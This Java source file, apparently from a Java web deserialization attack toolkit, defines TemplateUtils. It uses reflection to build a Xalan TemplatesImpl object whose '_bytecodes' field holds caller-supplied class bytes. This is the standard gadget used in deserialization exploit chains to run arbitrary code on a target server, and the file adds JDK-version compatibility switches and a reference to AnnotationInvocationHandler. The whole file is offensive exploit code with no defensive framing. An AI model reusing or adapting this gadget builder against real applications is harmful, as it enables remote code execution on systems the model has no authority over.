package com.reajason.javaweb.deserialize;

import com.reajason.javaweb.deserialize.utils.Reflections;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import lombok.SneakyThrows;
import net.bytebuddy.ByteBuddy;
import net.bytebuddy.dynamic.DynamicType;

/**
 * @author ReaJason
 * @since 2024/12/9
 */
public class TemplateUtils {
    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";
    public static Class TPL_CLASS = TemplatesImpl.class;
    public static Class ABST_TRANSLET = AbstractTranslet.class;
    public static Class TRANS_FACTORY = TransformerFactoryImpl.class;

    static {
        try {
            // 兼容不同 JDK 版本
            if (Boolean.parseBoolean(System.getProperty("properXalan", "false"))) {
                TPL_CLASS = Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl");
                ABST_TRANSLET = Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet");
                TRANS_FACTORY = Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl");
            }
        } catch (Exception ignored) {
        }
    }

    @SneakyThrows
    public static TemplatesImpl createTemplatesImpl(byte[] bytes) {
        TemplatesImpl templates = new TemplatesImpl();
        byte[] fooBytes = new byte[0];
        try (DynamicType.Unloaded<Object> make = new ByteBuddy()
                .subclass(Object.class).name("foo")
                .make()) {
            fooBytes = make.getBytes();
        }

        Reflections.setFieldValue(templates, "_bytecodes", new byte[][]{
                bytes, fooBytes
        });

        Reflections.setFieldValue(templates, "_transletIndex", 0);
        Reflections.setFieldValue(templates, "_name", "SimpleJava");
        Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());
        return templates;
    }
}
